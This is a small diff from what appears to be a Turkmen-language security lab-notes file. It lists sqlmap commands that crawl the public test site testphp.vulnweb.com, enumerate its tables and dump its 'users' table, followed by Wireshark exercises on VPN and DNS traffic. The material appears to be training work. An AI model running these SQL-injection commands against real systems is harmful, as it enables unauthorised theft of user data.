@@ -10,6 +10,7 @@ sqlmap --url http://testphp.vulnweb.com/login.php --crawl 2 -batch --threads 3 -
 sqlmap --url http://testphp.vulnweb.com/login.php --crawl 2 -batch --threads 3 -D acuart --tables
 sqlmap --url http://testphp.vulnweb.com/login.php --crawl 2 -batch --threads 3 -D acuart -T users --dump
  2
+ 
 Wireshark-da vpn tunel arkaly geçýän maglumatlaryň gowşaklyklaryny tapmaly
 3 
 Wireshark ulanyp DNS protokolyny seljermeli gowşaklyklary anyklamaly.
